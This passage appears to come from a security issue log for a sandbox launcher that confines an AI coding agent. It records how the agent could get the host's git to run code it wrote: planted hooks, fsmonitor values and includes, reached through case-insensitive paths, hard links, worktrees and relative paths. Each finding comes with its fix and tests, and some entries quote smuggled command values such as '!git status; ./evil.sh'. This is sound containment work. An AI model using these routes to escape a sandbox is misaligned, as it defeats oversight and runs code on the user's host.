- **Severity: HIGH.** Confidence: CONFIRMED. The host's git ran the agent's program through each of the cases below.
- **Location:** sandbox.sh: `launcher_ro_overlay()`, where a git directory under an overlay joins the post-pass (`if [[ -d "$g/objects" && -f "$g/config" ]]; then pgd+=`). Also `_ro_fifo_search()`'s link pass, whose `find -L … -type f` never matches a dangling link.
- **What's wrong:** each of these launches in silence, and in case (a) the rescan after the session is silent too:
  - (a) a `config` that is a dangling link, which a later session fills in;
  - (b) a repository with no `config`, whose hook links are then not walked;
  - (c) a worktree-shaped git directory (no `objects/`), whose `config.worktree` includes a writable file, or whose `commondir` is a link to one.
  - A protected repository in the same state gets the "is a symlink" WARNING, or the include WARNING.
- **Fix direction:** put every git directory under an overlay through the post-pass, with no condition on `objects/` or `config`, and take its config from its `commondir` where it has one. Warn on a link at any of the names git reads, whatever it leads to, as the protected path does.
- **Also found:**
  - The `hooks/` link check ignores its `find`'s exit status, so a timeout passes.
  - `-name` should come before `-links`, so `find -L` stats only the hook names.
  - The link pass spawns one `find` per entry, twice per launch: about 0.7 s for 150 repositories.

### GIT-38: a case-insensitive filesystem defeats every "inside this mount" test
- **Status: FIXED on Linux** (2026-11-07), after three reviews of the fix, **and on WSL's drvfs** (2026-11-07, platform-issues PLAT-8, below); macOS verifies it (PLAT-8's APFS half). Found by the review of the GIT-36/37 fix.
  - **The fix:** every path compared with a mount is spelled as on disk where it can be spelled otherwise.
    - `_cd_phys()` resolves as before, with bash's `cd -P`, and then `_disk_spell()` respells the result, which reaches `_gd_resolve()` (a `gitdir:`, a `commondir`), `core.worktree`, `core.hooksPath`, an include's directory, the writable mounts' sources (`bsrc`) and the group's own root (`_git_skip_root`).
    - `_disk_spell()` asks `getcwd` (an external `pwd -P`, found once, with an absolute path) only for a path that crosses a directory ignoring case. `_ci_path()` decides that with builtin tests: a component whose case, turned over, names the same file. So a case-sensitive filesystem costs no process (G118 counts them).
    - Each directory is asked once (a cache). At most `AI_CONTAINERS_SPELL_MAX` (5000, a test knob) per launch, past which the launch is refused, naming it, as past `SANDBOX_GIT_MAX`: the agent can make directories.
    - Link walks follow links in bash's spelling (`_cd_bash()`), and `_walk_exposed()` respells each record (a link, a `..` step, where the walk ends) before it judges it, in the launcher's own shell, where the cache lasts.
    - `_gd_resolve()` judges one that does not exist by its spelling on disk too (`_canon_lex()`). It names one reached "through a link" only when a link is on the way as written, `..` and all (`_lex_link_dir()`): a case or Unicode difference is not one.
    - A submodule's checkout is respelled after the batch that resolves them, so one its index records in another case is named as "not where its index says" and not followed.
  - **The review of the fix** found three HIGH and three MEDIUM issues, all fixed here:
    - The new test failed the suite where it cannot run; it now says `SKIP:`.
    - A submodule recorded in another case got a writable pin over a launcher's read-only overlay, so the agent could rewrite `sandbox.sh`. This was there before the fix; the gitlink check compared bash's spelling with itself.
    - A `getcwd` process per walk step let an agent's tree stretch a launch from 18 s to 180 s on plain Linux.
    - Looking for a link on the normalised path dropped the warning for `lnk/..`.
    - The test left most of the fix unpinned. Every part is now pinned by a check, and each check was seen red on a mutant of its part.
    - LOW ones fixed: `_git_skip_root` used bash's spelling, and a `pwd` found through a relative `PATH` entry was used.
    - Its third HIGH issue is GIT-41, below.
  - **The second review** found three HIGH and two MEDIUM issues, all fixed here (the user's choice). Two were older than the fix:
    - A `gitdir:` written `//<path>` kept bash's leading `//`, which no mount's prefix matched. It was unprotected before the fix too, but the fix had silenced the warning it drew. `_cd_bash()` now takes `//` as `/`.
    - git opens its own names in any case where case is ignored, but the scan matched them case-sensitively. A repository the agent spelled `.GIT`, `head`, `CONFIG` and so on was never found, protected or named after the session. The scan now uses `-iname`/`-ipath` for git's names, and each test on them compares in lower case. A name that matches only in another case counts only where its directory ignores case (`_ci_path()`), so a case-sensitive filesystem sees what it saw before. Pre-existing.
    - A hook link's or include's target in a directory that did not exist yet kept bash's spelling. `_spell_rec()` now respells the longest existing directory.
    - On a case-sensitive filesystem an agent's tree still made a launch 2.3 times as long: `_ci_path()` was asked about the same directories over and over. It now remembers each prefix (`_ci_memo`), and `_spell_rec()` forks nothing. Measured with 5 repositories × 24 hook links of 120 `..` steps each, second launch: 14.5 s at `c69c356`, 16.1 s now.
    - A `core.hooksPath` into a directory that did not exist yet was never named. It is now judged where it would be. Pre-existing; husky's `.husky/_` is gone after a `git clean`.
  - **The third review** found one HIGH and two MEDIUM issues, all fixed here, and LOW ones:
    - The hard-link check of GIT-31 matched hook names with `-name`, so `hooks/PRE-COMMIT` hard-linked to a project file launched, and git ran it. It is `-iname` now. Pre-existing.
    - G118's count of `pwd` processes failed wherever `TMPDIR` ignores case (macOS); it is not applied there.
    - The case-insensitive scan's seven `-ipath` prunes ran on every entry. They now run only after a name test, which makes the scan faster than before the fix: 0.17 s against 0.36 s on `/usr/share`.
    - LOW ones fixed:
      - A `.Git` on a case-sensitive filesystem was taken for git's.
      - `_gd_resolve()` ran `_canon_lex()` for targets that exist.
      - A linked worktree outside every mount, whose `gitdir` is written in another case, drew "no worktree is known".
      - `_ci_path()` looped on a relative path, and `_spell_rec()` turned `/` into nothing.
      - The helpers' state could come from the environment, `_cd_phys_pwd` being the program run as `pwd`.
    - On ext4 casefold, `getcwd` may spell a directory as the lookup that made its dentry, while the scan spells it as `readdir` does. A difference makes a gitlink skipped with its WARNING. Not measured.
    - With no `pwd` reachable by an absolute path on `PATH`, `_disk_spell()` respells nothing, silently.
    - `${c~~}` turns over ASCII only under `LC_ALL=C`, so a case-ignoring directory reached only through names without ASCII letters is not seen.
    - Two others predate the fix. A gitlink recorded in another case is now skipped and named, and its `.git` file stays writable. The agent renaming `.agent-blocked` in case, with an unlistable directory in it, makes later launches refuse.
    - A submodule's `.git` file spelled `.GIT` on disk is bound twice, under both spellings: `had[]` is keyed by spelling.
    - Several of the lower-case comparisons are reached only in combinations no check builds, and are not pinned: the NOTE for a mount inside a `.git`, a relative `core.hooksPath` from a `.GIT`, `*/worktrees`, the `-ipath` prunes, `_gdi_follow()`'s second test, a worktree's `gitdir` back-pointer, and the `.git/modules` `.git` file.
  - **Why `getcwd` is enough on Linux:** a directory has one dentry, so however it was reached, `getcwd` spells it one way while it is cached. On a casefold tmpfs that is the spelling it was made with; on ext4 it may be the spelling of the lookup that made the dentry, which is still one spelling.
  - **Not measured:** macOS's `getcwd`. PLAT-8's APFS half asks for it.
  - **Measured on WSL's drvfs** (PLAT-8, 2026-11-07): `getcwd` prints the spelling a directory was reached by, and 11 G117 checks failed.
    - Every G117 case needs a read-only bind in a directory that ignores case, which GIT-41 now refuses there, so they no longer run on such a filesystem.
    - What is left is a path whose parent above a case-sensitive mount is written in another case: a `gitdir:`, an include, or a mount.
    - **Fixed:** `_disk_spell()` spells a directory on a filesystem whose kernel does not ignore case (`_ci_alias_fs()`) from readdir (`_ds_readdir()`: a case-folding glob of its name, the entry that is the same file), and asks `getcwd` only where the kernel does.
    - Pinned by G121's case-sensitive run: a `gitdir:`, an include and an `EXTRA_MOUNTS` path, each with a parent in another case. All three were red before the fix.
  - **Cost:** no `pwd` process on a case-sensitive filesystem, and builtin tests on each new directory. The scan is faster than before the fix. Where case is ignored, one process per directory, at most 5000 a launch (about 1.6 ms each on Linux).
  - **Tests:**
    - `tests/test-git-internals-ro-casefold.sh`, G117, has 21 checks.
      - Seen red on the code before: a `gitdir:`, a `core.worktree`, an include and a hook link's target, each written in another case; the second review's hook link and include into a missing directory; a `.GIT` repository, its submodule, a `.GIT` file and the git directory's worktree, and one made in the session; the third review's hard-linked `PRE-COMMIT`.
      - Seen red on the fix before the third review: a linked worktree whose `gitdir` is written in another case.
      - Seen red on mutants of the parts they pin: a submodule recorded in another case, a mount named in another case, a `..` step and a link step written so, a missing `gitdir:`, the group's root, and the budget.
      - The `.GIT` directory with no `head` is protected through its `commondir` placeholder, as G77's is.
    - It runs where `TMPDIR` ignores case, and otherwise in a user namespace with a casefold tmpfs, saying which. Elsewhere (CI's Ubuntu 24.04, the floor container) it says `SKIP:`.
    - G118 in `tests/test-git-internals-ro-reads.sh` runs on every filesystem: `lnk/..` still named, a `//` gitdir protected, and a missing `core.hooksPath` named. Where `TMPDIR` is case-sensitive it also checks that no `pwd` process runs and that a `.Git` directory is left alone.
- **Severity: HIGH** where it applies: macOS's default APFS, and a WSL path under `/mnt/<drive>`. Confidence: CONFIRMED on a casefold tmpfs (`chattr +F`) on Linux; LIKELY on macOS, which runs the same bash `cd -P` code.
- **Location:** sandbox.sh: `_cd_phys()` and every test of whether a path lies in a mount: `_gdi_follow()`, the gitlink checks in `git_dirs_in()`, and `_in_writable()`.
- **What's wrong:** `cd -P` keeps the spelling it was given, and each "inside this mount" test is a case-sensitive prefix match.
  - A `.git` file's `gitdir: ../../PROJ/node_modules/gd`, spelled in another case, names a git directory the launch never protects, and the host's git ran its `core.fsmonitor`.
  - The same happens with a `core.worktree` spelled that way.
- **Fix direction:** take each resolved path from `getcwd` (`pwd -P`), which reports the spelling on disk, keeping the NUL framing, before any prefix test.

### GIT-39: an include whose target has a second name inside a writable mount is not named
- **Status: FIXED** (2026-11-07). Found by the review of the GIT-36/37 fix.
- **Severity: MEDIUM.** Confidence: CONFIRMED. With `include.path=<outside>/inc.cfg` and `ln <outside>/inc.cfg <mount>/side.cfg`, the next launch was silent. Appending a `core.fsmonitor` through `side.cfg` made the host's git run it.
- **Location:** sandbox.sh: `_walk_exposed()`, whose `=` step asked only whether the target itself lies in a writable mount.
- **What was wrong:** a read-only bind protects a path, and an include names a file. A file outside every mount was taken as out of the agent's reach, but a second name of it in a writable mount writes the same file. An earlier session with a wider mount can make one, and so can a tool that deduplicates files. A launcher link to such a file was missed the same way. A hook's was already refused (GIT-31, G112).
- **Fix:** `_fs_linked_in()` lists, once per launch, the files with a second name in each writable mount on the file's device, and `_walk_exposed()` asks it about a file with a second name that lies in no writable mount.
  - Found: the include, or the launcher link, is named, with the mount and the `find <mount> -xdev -samefile <file>` that lists the other name.
  - A listing that fails, or runs out of the FIFO search's budget, cannot rule one out: the file is named as one the mount could not be searched for in full.
  - The hard-link refusal for a link out of every writable mount (`_fs_other_names()`) uses the same listing instead of a `find -samefile` of its own, so a launch lists each mount once, however many files and checks ask. Its cap of 64 files, which failed closed, is gone with the per-file search terms it bounded.
- **The review of the fix** found three MEDIUM defects, all fixed:
  - **The FIFO search's clock started at the first listing,** so the walks after it counted against the search's 90 s, and launches that had passed were refused, blamed on "very many files". The listings now take at most 60 s, and the search's clock counts only the time they took.
  - **Hooks in a `core.hooksPath` outside every mount were never walked:** a hook file there with another name in a writable mount, or a hook link there leading into one, launched in silence. They are walked as `hooks/`'s are, a hook file too, when the directory, resolved, lies outside every writable mount or under a read-only overlay. That also fixes GIT-35's first case.
  - **Each lookup read every mount's device again:** 20 repositories of 28 such hooks took 54 s, where they took 22 before the fix. Each mount's device, and each file's answer, is now kept for the launch.
  - And one LOW: the listing was loaded into the shell, whose time and memory the agent could fill with names (about 11 µs and 270 bytes a line). Listings now go to files, at most 64 MiB in all, and one `grep` per file asked about reads them; at most 256 files are asked about. Past either, nothing is ruled out.
- **The re-review of the fix** found no fail-open in the listing, and fixed:
  - **Listings past the FIFO search's deadline** get at least 1 s again, as its own searches do; skipped, a hook link into the Nix store was refused.
  - **A file whose device cannot be read** is not ruled out, as the hard-link refusal takes one; the include check skipped it in silence.
  - **The listings are removed before docker runs,** not kept in TMPDIR, often memory, for the whole session.
  - **A last line `head -c` cut short is dropped:** it could match a shorter inode number and claim a name that `find -samefile` cannot find.
  - **The test of the time bound** read `ps`'s program name as exactly `timeout`; macOS prints the path, and `gtimeout` is taken first.
  - It also found what GIT-35 now holds: a `core.hooksPath` reached through a link the agent can repoint, which can silence even the husky NOTE, and one set by an include or `config.worktree`. Both are older than this fix.
- **Known limits** (LOW, from the same review, kept):
  - **A second name on a filesystem mounted inside a writable mount** is not seen: `find -xdev` does not enter it, and docker's binds are recursive. GIT-31's search had the same limit. Logged as GIT-43.
  - **Failing closed is noisy:** a directory in a writable mount that the launching user cannot read, or a file removed while the listing runs (`pnpm` working in `node_modules`), makes the whole listing count as cut short. A second name under a read-only overlay counts as one the agent can write.
  - **The lookups are not timed:** one `grep` per file asked about, over at most 64 MiB, took 6.4 s for 256 files.
- **Tests:** G119 in `tests/test-git-internals-ro-reads.sh`, each seen red on the code before:
  - an include of such a file, directly and through an included file;
  - its other name in a directory the listing cannot read;
  - a listing cut off by its time bound, and each listing run under `timeout`;
  - a launcher link to such a file;
  - a hook file and a hook link in a `core.hooksPath` outside every mount, a hook link in one under a read-only overlay (GIT-35's first case), and one the agent can change named once, its hooks not walked as well;
  - an include of such a file whose device cannot be read;
  - the listings gone while docker runs, and nothing of the launcher's left in TMPDIR after it;
  - one listing per mount, one read of each mount's device and one lookup per file, for three includes and three hooks;
  - on the functions alone: the FIFO search's clock after a listing and a walk, a listing after the 60 s and after the deadline, a listing past its space, a line it cut short, and the 257th file asked about;
  - an include whose other name lies outside every mount, and hooks in such a `core.hooksPath` with no other name, not named.
  - G112's cost check now counts the listings, and also checks the hook's NOTE.
- **Mutants:** 28 by hand, over the fix and both reviews' fixes, all killed except dropping the same-device filter, which only costs time, since every mount in the tests is on one device.

### GIT-42: a program a config names by path, outside every mount, with a second name in one
- **Status: FIXED** (2026-11-08). Found by the review of the GIT-39 fix. The fix takes the wider case too: a program named by a path the agent can change. `_git_walk_keys()` now also returns the keys that run a program (the list `_git_exec_keys()` uses, shared as `_git_prog_keys`), so the one read of each config gives them; the include walk keeps each value once per file, and `_git_prog()` reads what it runs as a shell reads a command line, up to its eighth word: past a `!`, assignments, `exec`, `env` and its options, to the script an interpreter (`sh`, `python3`, `node`, …) runs and the interpreter itself where named by a path, else the program where named by a path; a key whose value is a whole path (`*.path`, `gpg.program`) is taken whole, not split at a space. A word holding a shell expansion, quoting or an operator (`$HOME/x`, transcrypt's `"$(git rev-parse --git-dir)"/…`, a function alias), an interpreter's inline code (`-c`), `~user/`, and a relative program of a linked worktree whose checkout this launch does not know, are named as not judged, never judged where they are not (review of the fix: `!$HOME/bin/x` was judged as a relative path, and `python3 tools/c.py` was not judged). The second review found the reading quadratic in the value's length: one value with 64000 leading spaces, in a config three repositories included, took a launch from 2 s to 60 s, in silence, and the budget below counts calls, not bytes. Now a value over 4096 bytes is named as not judged without being read, and every step is a regex or a substring, linear: 200 values of 4000 spaces take about a second. The same review's LOWs are fixed too: a not-judged NOTE quotes the command, cut to 100 characters, never `-c` or `f()`; an interpreter's options skip their arguments (`-W ignore`, `-I lib`), `-m mod` is judged as `mod.py`, which runs from the checkout first, and a single-dash cluster holding `c` or `e` (`-pe`) is inline code; the wrappers `nice` and `timeout` count, past their options' arguments and `timeout`'s duration, and `env -S` is not followed. The final review found three more, fixed: a not-judged NOTE that quoted the command printed a credential helper's token on every launch, so it now names the key and why, never the value; the budget counted calls, not bytes, and short values alone cost 15 s at 20000 on a loaded host, so it is now 5000 keys and 256 K characters a launch; and an interpreter's options are its own (`bash -e` and `python3 -E` are no code, `perl -e` is; `bash -o` takes an argument, `bash -r` none; `-mpkg` attached; `exec -a`). The split of an entry from its key, quadratic in the key, was older than this fix and is GIT-49. Its review found a key over 256 characters skipped without being counted, so a planted file of them was read with no bound (3000 of 300 characters cost 43 s more): such a key now counts among those that run a program. It also found node's long options (`--experimental-vm-modules`) and an attached argument (`perl -Mfeature=say`, `ruby -rset`, `python3 -Wonce`) taken for inline code, and a `credential.<url>` key's user and password printed in every NOTE; both fixed (`_git_key_shown()`). The automated security review of the commits found three more, fixed: another command after the program (`!git status; ./evil.sh`) went unseen, judged by `git` alone, so any command operator left after it (`;`, `&`, `|`, a backtick, `$(`, a newline) now adds a not-judged entry; the reading failed open where the eight words ran out before the program, or at a glob (`./tools/*.sh`), both now not judged, and a wrapper's own arguments (`taskset 0x3`, `sudo -u root`) are skipped to reach the program, `sudo`, `xargs`, `setsid` and their like counting as wrappers; and the read itself was unbounded, every key held in memory before a budget counted it, so a config is now read to 1200 entries at most, past every budget a file has, a file read in part cut and its last `core.hooksPath` asked of git. The review of that round found a wrapper's PATH program skipped and its path argument judged instead (`nice git diff ./file`), now the program, which ends the reading, only `taskset`'s and `chrt`'s positional arguments skipped; and words running out after an interpreter, before its script, not followed now too. Known, and left, since they fail closed: an operator inside quotes (`--format='%h | %s'`) or a pipe into a program found on PATH (`diff-so-fancy | less`) gets a not-judged `NOTE:` on every launch, a config of exactly 1200 entries counts as cut, and after `taskset` or `chrt` a path argument of a program found on PATH (`taskset 0x3 mytool ./arg`) is judged as the program. A wrapper whose program is not found (an option read as taking an argument it does not take: `sudo -n ./x`) is named as not judged. The automated security review of the pushed fix (`809ee06`) found words split on any `[[:space:]]`, where the shell splits on space, tab and newline only: `!git<VT>./evil` was read as `git`, found on PATH, and stayed silent, while the shell runs `./git<VT>./evil`, a path the agent can make. Words are now split where the shell splits them, on space and tab; a newline, which ends a command, is another command after it, a second review of the fix found it read as a space; and a word holding any other control character is not followed (G134). Each is judged as a `core.hooksPath` is, from the files it is read from: from `/`, or, relative, from each checkout (the git directory itself only in a bare repository), a linked worktree re-judging the common config's relative ones from its own checkout, never those the main worktree's `config.worktree` sets; walked by `_walk_exposed()`, so a program in a writable mount, a link on its way the agent can repoint, a directory a `..` steps out of, and a second name in a writable mount (`_fs_linked_in()`) each get a `NOTE:` naming the key. Counted in the launch's budget of 1000 ways. Bounded: past 1000 such keys in one file, or 5000 or 256 K characters of them in a launch, the walk is cut, as past 100 include entries (review of the fix: 50 planted repositories reaching 6000 aliases each took a launch from 21 s to 44 s, in silence), and at most 50 programs a git directory are judged, each with a `WARNING:`; such keys do not count as include entries, so a team's config of aliases does not cut the include walk. Not judged: a program found on `PATH`, and anything where git does not run, as before. Tests: `tests/test-git-internals-ro-config.sh` G134 (a relative program in the checkout, a `!` credential helper and a `!` alias by their first word, one outside every mount with a second name in one, one through a link the agent can repoint, one an included file sets, a linked worktree's from its checkout, named once, the bounds per file and per launch, what stays silent, an interpreter's script, one after an assignment and `exec`, a whole path with a space, a shell expansion and `~user/` named as not judged, a linked worktree's whose checkout is unknown, the main worktree's `config.worktree` not taken for a linked one's, options and their arguments, `-m`, inline code and functions, a 64000-byte value named in no time, 200 values of 4000 bytes read in seconds, an interpreter's own options, a credential helper's value never printed, a credential URL's user and password blanked, the byte budget, 5000 such keys and 3000 of 300 characters timed against one, another command after the program, too many words, a glob and a wrapper's arguments, and a config read in part with its `core.hooksPath` past the cut still judged and bound), each seen failing first.
- **Severity: LOW.** Confidence: PLAUSIBLE.
- **Location:** `sandbox.sh: launcher_ro_overlay()`. The keys that make git run a program (`core.fsmonitor`, `credential.helper`, `diff.<driver>.command`, `filter.<driver>.clean` and the rest) are named once, at the first protection (`_git_exec_keys()`), and the programs they name are never judged.
- **What's wrong:** such a program outside every mount, with a second hard link inside a writable mount, can be rewritten by the agent through that link, and the host's git runs it. Includes and hooks are judged for this (GIT-39); programs are not.
- **Fix direction:** judge the program each such key names, where it is a path, as an include's target is judged (`_walk_exposed()`). A program named by a writable path is the wider case, and is the same gap.

### GIT-44: a git directory outside every mount, whose worktree is mounted, is not judged
- **Status: FIXED** (2026-11-07). Found by the review of the GIT-35 fix; widened by its re-review.
- **Severity: MEDIUM.** Confidence: CONFIRMED. This is husky's own layout under `git worktree`, and one worktree per agent is a common setup.
- **Location:** `sandbox.sh: launcher_ro_overlay()`. Its post-pass judged only the git directories it protects or finds under a read-only overlay, and a linked worktree's `core.hooksPath` not even then.
- **What was wrong:** with only a linked worktree mounted (`git worktree add <mount>/feature`), and the repository outside every mount with `core.hooksPath=.husky/_`, the launch was silent. The agent wrote `feature/.husky/_/pre-commit`, and the host's next commit there ran it. A `--separate-git-dir` checkout was the same, and the repository's includes and hook links were not judged either. Inside the mounts (the re-review of the GIT-35 fix, each confirmed silent while `git rev-parse --git-path hooks/pre-commit` led into the mount):
  - a linked worktree whose `config.worktree` sets `core.hooksPath` to a writable directory (the main use of `extensions.worktreeConfig`; the agent can make a linked worktree itself);
  - a linked worktree at `h/a/wt` with `core.hooksPath=../../o/hooks`, out of reach from the main worktree, `h/o/hooks` from the linked one;
  - a `--separate-git-dir` repository whose checkout is not where its git directory lies, its relative `core.hooksPath` taken from the checkout.
- **Fix:**
  - **Who names what:** the scan (`_gdi_follow()`, and the loop that finds the repository a mount lies in) records, for the launch, each `.git` it follows: the git directory, and the checkout (`_gref_add()`).
  - **Git directories outside every writable mount** that such a `.git` names join the post-pass, and so does their common directory, judged with no binds: config, includes, hook links and hook files, `core.hooksPath`, and a link at `config`, `config.worktree`, `commondir` or `hooks`, named (a `WARNING:`) where its way out the agent can change, and read through either way. Only git directories; and of those named by `.git` files under a read-only overlay, at most `SANDBOX_GIT_MAX`, taken in the order found, past which a `WARNING:` names five and counts the rest.
  - **A linked worktree's `core.hooksPath`** comes from what its common directory's judging collected — common directories are judged first — and from its own `config.worktree` where git reads it; never from a `config` of its own, which git ignores.
  - **Bases for a relative value:** where the `.git` lies, each checkout whose `.git` names the git directory, a linked worktree's `gitdir` (relative too, as git 2.48 and later can write it), and each `core.worktree`; the git directory itself only for a bare repository.
- **The review of the fix** found, and these are fixed:
  - **The repository a mount lies in was not judged** (MEDIUM): husky's layout for a project not at the git root (`husky frontend/.husky`), mounting `frontend` alone, ran the hooks the agent wrote there. The scan recorded `.git` files only.
  - **A link whose own way out is safe hid what lay behind it:** a `config` linked to a file that includes one in the mount, a `config.worktree` linked to one that sets `core.hooksPath`, and a `hooks` linked to a directory whose hooks link into the mount, were silent.
  - **What the agent could make it cost:** a list searched per git directory made a launch quadratic in the `.git` files planted under a read-only overlay, which count toward nothing (2000: 44 s before the fix, 92 s with it).
  - **Any directory a planted `.git` file named was judged,** a file there read as its config.
  - **A relative `gitdir` was no base,** and with no base the git directory itself was one, naming a place git never runs hooks in.
- **The re-review of the fix** found no HIGH or MEDIUM; these LOW are fixed:
  - **A `.git` link where a mount lies in a repository** (as `repo` checkouts have it), which git follows, was skipped, and the next repository up judged instead.
  - **The repository a mount lies in, inside another writable mount past that mount's scan** (`vendor/` is pruned), was neither protected nor judged (older than this fix): it is protected in that mount's view, as a `.git` file's target is.
  - **The cap followed hash order:** a real repository could be cut while planted ones were judged. It now applies only to git directories named from under a read-only overlay, in the order found; protected `.git` files count toward `SANDBOX_GIT_MAX` already, and the repository a mount lies in is one per mount.
  - **An absolute `core.hooksPath` was named once per linked worktree:** they take only relative values from their common directory.
  - **Wording:** the cap `WARNING:`, the budget `WARNING:` for a `hooks/` that is no `core.hooksPath` directory, and a hook link's "reads".
- **The final review of the fix** found, and these are fixed: a mutant taken for equivalent was not (the order of the cap's two passes), and the `.git` link branch registered no worktree for its target, so a submodule under a pruned `vendor/` was not followed and a `WARNING:` said so; a target in another writable mount was not queued there.
- **Tests:** G126 (first numbered G122, which GIT-41's casefold test also took) in `tests/test-git-internals-ro-config.sh`, each seen red on the code before:
  - a linked worktree mounted alone: its repository's `core.hooksPath`, hook link into the mount, include of a file in it, and `config` made a link into it;
  - a `--separate-git-dir` checkout mounted alone;
  - inside the mounts: a linked worktree's `config.worktree`, a relative value from a linked worktree's checkout, from one outside every mount (its `gitdir`), and from a separate git directory's checkout;
  - quiet: a linked worktree mounted alone whose repository sets nothing, and a `config` in a linked worktree's git directory, which git ignores;
  - after the review: the repository a mount lies in; an include in a `config`, and a hook in a `hooks/`, reached through links; a hook file with another name in the mount; a directory that is not a git directory, and a `commondir` naming one that is not a common directory; past `SANDBOX_GIT_MAX`; a relative `gitdir`, and no checkout known;
  - after the re-review: the repository a mount lies in through a `.git` link, and inside another writable mount past its scan; past `SANDBOX_GIT_MAX`, a mounted worktree's repository still judged, also when a planted `.git` file names it, and three repositories mounts lie in judged with the cap at two; an absolute `core.hooksPath` named once;
  - after the final review: through a `.git` link, the repository's index read against the checkout (a submodule under a pruned `vendor/` protected), and a target inside another writable mount protected there.
- **Mutants:** 29 by hand, over the fix and all three reviews' fixes, all killed but one: judging common directories before their linked worktrees changes nothing in any layout git makes, where a linked worktree's git directory lies inside its common one. (Taking the capped git directories before the uncapped ones does change something, the final review found: one named from both was cut. A test now holds that order.)

### GIT-46: a linked worktree's gitdir the agent writes chose where a relative core.hooksPath was judged
- **Status: FIXED** (2026-11-07). Found by the automated security review of `c6316af` (the GIT-44 fix, rated MEDIUM), with two LOW findings of its second final review.
- **Severity: LOW to MEDIUM.** Confidence: CONFIRMED. Not a regression: before GIT-44 no relative `core.hooksPath` of a linked worktree was judged at all.
- **Location:** `sandbox.sh: launcher_ro_overlay()`, the bases of the `core.hooksPath` check, and `git_dirs_in()`'s up-loop.
- **What was wrong:**
  - **A linked worktree's `gitdir`,** which names its checkout, lay in a writable mount and was not bound, so the agent could rewrite it, and choose where a relative `core.hooksPath` was judged from: a decoy where the hooks git really runs from would be named. With no checkout known, such a value was judged from nowhere, in silence.
  - **A `.git` link whose target lies in the same mount, past what its scan reaches** (`vendor/` is pruned), was neither protected nor judged; a `.git` file there is (`_gdi_follow()`).
  - **A `.git` link's target inside a writable mount** was judged from the git directory, not from the link's checkout, so the NOTE named a place git never runs hooks in.
- **Fix:** a linked worktree's `gitdir` is bound `:ro` with `config` and `commondir`, and held to the hard-link refusal under a read-only overlay too; one naming a checkout that does not exist (deleted and never pruned, or made in a container with `/workspace` paths) is judged from where it would be, silent outside every mount; a relative `core.hooksPath` with no `gitdir` to read is named as not judged; the `.git` link branch records its checkout whatever the target's writability (`_gref_add()`), and protects a target in the same mount there.
- **The final review of the fix** found the not-judged NOTE printed on every launch for a worktree whose checkout is gone, and a hard-linked `gitdir` under a read-only overlay not refused; both fixed.
- **Tests:** in G126 (`tests/test-git-internals-ro-config.sh`), each seen red on the code before: `gitdir` bound read-only; no `gitdir`, named as not judged; checkouts that are gone, judged from where they would be; a hard-linked `gitdir` under an overlay, refused; a `.git` link's target in the same mount past its scan, protected and judged from the checkout; one in another writable mount, judged from the checkout.
- **Mutants:** 6 by hand, all killed.

### GIT-45: $GIT_DIR, where push hooks run, is not a base for a relative core.hooksPath
- **Status: FIXED** (2026-11-08), as the user chose (option B, narrowed): every git directory, a linked worktree's too (a push into its checkout runs hooks there; measured, git 2.56), is a base for a relative `core.hooksPath` (`_git_push_hooks()`). Of one that stays inside it (no `..`), read from the config git reads for it and the `config.worktree` it reads with that, the first directory there is bound read-only, made as you where there is none: husky's `.husky/_` gets `.git/.husky`, and nothing below can be made or swapped. A file or a link on the way, a link to `hooks/` included, refuses the launch, naming what to remove, and so does a directory that cannot be made in a git directory you own (the agent, running as you, could make `.git` read-only in one session and writable in the next); in another user's, a `WARNING:`. One whose first component is a name git itself keeps there is never made or bound: a directory that must stay writable (`objects/`, `refs/`, `logs/`, `info/`, `worktrees/`, `modules/`, `lfs/`, …; binding `logs/` or `refs/heads` read-only broke git) or one of its files (`config`, `HEAD`, `index`, a linked worktree's `locked`, …), which must never become a directory (`core.hooksPath=config/git-hooks` made the launch refuse the user's own repository, `logs/HEAD/x` made `.git/logs/HEAD` a directory, and in a linked worktree `config` was made one). Nor is one docker cannot be handed, whose bind made the launch drop all of the repository's own. Hooks already there are named once (a `push:` line in the record of reported repositories), so a repository an earlier engine protected, which left the directory writable, has them named too. Those, one that climbs out of `.git`, one an include sets, and the git directory itself (`.`, which cannot be bound) are judged from it as from a worktree, the `NOTE:` saying git runs them for a push: `index/x` can run a hook once the agent replaces `.git/index` with a directory (measured), and such a value can only have been set before the first protection, which names `core.hookspath`. Its value comes from the include walk's own read of the config, so it costs no read (G120). Not covered: a relative `core.hooksPath` in the global, system or XDG config, which the launcher never reads. Tests: G132 in `tests/test-git-internals-ro-config.sh`, each case seen failing first. The review of the first fix found its pins left the second directory of `frontend/.husky/_` swappable (HIGH, reproduced in docker), a `commondir` planted on the way switching the bind off, linked worktrees left out, and hooks an earlier engine left unnamed; this design replaced it, and its re-reviews the handling of git's own names, of a directory that cannot be made and of one docker cannot be handed. Was: OPEN (2026-11-07). Found by the review of the GIT-35 fix.
- **Severity: LOW.** Confidence: CONFIRMED. It needs a push into the repository from elsewhere on the host.
- **Location:** `sandbox.sh: launcher_ro_overlay()`, the `core.hooksPath` check, which judges a relative path from the worktrees.
- **What's wrong:** git runs the push hooks (`pre-receive`, `update`, `post-receive`, …) in `$GIT_DIR`, a non-bare repository's too. With `core.hooksPath=../../outside-hooks`, out of every mount from the worktree, but inside the mount from `.git`, a push into the repository on the host ran a hook the agent wrote.
- **Fix direction:** judge a relative path from `$GIT_DIR` too, for the push hooks. Every husky repository would then get a NOTE about `.git/.husky/_`, which the agent can make; say it is for a push into it.

### GIT-49: splitting a git config entry from its key was quadratic in the key's length
- **Status: FIXED** (2026-11-09). Found by the final review of the GIT-42 fix, which widened it: before it, the keys split this way were the include walk's (`include.path`, `includeIf.*.path`, `core.hooksPath`, `core.worktree`) and those the first protection names.
- **Severity: MEDIUM.** Confidence: CONFIRMED (measured): three planted `includeIf` conditions of 64 KB took a launch from 2 s to 19 s, in silence, and where the first protection named its keys the bounded config read timed out and the launch was refused (exit 1, after 11 s).
- **Location:** `sandbox.sh: launcher_ro_overlay()`, where the binding pass and the include walk split each `<key>\n<value>` entry `_git_walk_keys()` gives, and `_git_exec_keys()`.
- **What was wrong:** git prints a key of any length (an `includeIf` condition, an alias name, a filter's subsection), and `${e%%$'\n'*}` and `${e#*$'\n'}` are quadratic in what comes before the newline: one split took 0.1 s at 8 KB and 5 s at 64 KB.
